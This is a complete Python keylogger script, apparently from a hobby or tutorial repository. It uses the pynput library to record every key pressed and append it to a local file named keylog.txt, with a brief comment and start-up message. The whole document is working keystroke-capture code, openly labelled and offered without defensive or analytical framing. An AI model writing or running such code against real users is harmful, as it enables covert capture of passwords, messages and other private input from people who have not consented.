# Creates the file keylog.txt and logs it all for example you press "P" it logs "P" inside the text file

from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

if __name__ == "__main__":
    print("Keylogger started. Press keys... (Ctrl+C to stop)")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
